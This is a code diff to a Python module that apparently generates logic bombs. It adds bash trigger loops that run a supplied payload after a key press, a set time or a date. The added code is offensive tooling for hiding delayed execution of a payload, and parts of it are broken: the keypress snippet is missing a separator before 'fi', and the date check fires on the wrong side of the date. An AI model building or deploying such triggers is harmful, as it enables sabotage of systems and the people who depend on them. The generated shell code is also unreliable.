@@ -16,19 +16,21 @@ class ExecuteOnKeyPress(BaseTrigger):
     __input_name__ = "key name"
 
     def get_trigger(self, payload, triggering_entity):
-        logic = f"{triggering_entity}"
+        logic = f"""while true\ndo\nread -rsn1 input\nif [ "$input" = {triggering_entity} ]; then\n./{payload}fi\ndone\n"""
         return logic
 
 
 class ExecuteOnCertainTime(BaseTrigger):
 
-    __trigger_name__ = "Execute logic bomb on certain time"
+    __trigger_name__ = "Execute logic bomb on certain time (24 hour format)"
     __trigger_number__ = 2
     __takes_input__ = True
     __input_name__ = "time"
 
     def get_trigger(self, payload, triggering_entity):
-        logic = f"{triggering_entity}"
+        if triggering_entity[0] == "0":
+            triggering_entity = triggering_entity[1:]
+        logic = f"""while true\ndo\nif [ $(date +%k%M) -gt {triggering_entity} ]; then\n./{payload}\nfi\ndone\n"""
         return logic
 
 
@@ -40,5 +42,6 @@ class ExecuteOnCertainDate(BaseTrigger):
     __input_name__ = "date"
 
     def get_trigger(self, payload, triggering_entity):
-        logic = f"{triggering_entity}"
+        logic = f"""hm=$(date '+%s')\nwhile true\ndo\ntodate=$(date -d {triggering_entity} '+%s')\nif [ $todate -gt 
+        $hm ];\nthen\n./{payload}\nfi\ndone\n """
         return logic
